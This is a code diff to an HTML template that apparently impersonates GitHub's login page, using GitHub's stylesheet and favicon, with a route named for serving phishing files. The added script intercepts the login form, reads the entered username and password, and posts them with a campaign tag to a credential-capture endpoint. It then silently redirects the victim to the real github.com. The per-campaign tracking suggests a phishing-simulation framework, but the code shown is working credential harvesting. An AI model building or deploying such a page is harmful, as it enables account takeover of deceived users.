@@ -7,6 +7,61 @@
     <link rel="stylesheet" href="{{ url_for('serve_phishing_static', filename='css/github.css') }}">
     <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon-dark.svg">
 </head>
+<script>
+    let campaignName = "Unknown Campaign";  // Default value
+
+    // Fetch the latest campaign name
+    function fetchCampaignName() {
+        fetch("/api/latest-campaign")
+            .then(response => response.json())
+            .then(data => {
+                if (data.campaign_name) {
+                    campaignName = data.campaign_name;
+                }
+            })
+            .catch(error => console.error("Error fetching campaign name:", error));
+    }
+
+    // Capture credentials when the form is submitted
+    document.addEventListener("DOMContentLoaded", () => {
+        fetchCampaignName(); // Fetch campaign name when page loads
+
+        const loginForm = document.querySelector(".login-form"); // Select the form element
+        if (loginForm) {
+            loginForm.addEventListener("submit", function (event) {
+                event.preventDefault(); // Prevent default form submission
+
+                // Get user input values
+                const usernameOrEmail = document.getElementById("username").value.trim();
+                const password = document.getElementById("password").value.trim();
+
+                // Validate input fields
+                if (!usernameOrEmail || !password) {
+                    alert("Error: Please fill in all required fields.");
+                    return;
+                }
+
+                // Send credentials to the backend API
+                sendCredentials(usernameOrEmail, password);
+            });
+        }
+    });
+
+    // Function to send credentials to the backend
+    function sendCredentials(email, password) {
+        fetch("/api/capture-credentials", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ campaign: campaignName, email: email, password: password })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Captured:", data);
+            window.location.href = "https://github.com";  // Redirect after capture
+        })
+        .catch(error => console.error("Error capturing credentials:", error));
+    }
+</script>
 <body>
     <div class="container">
         <div class="logo">
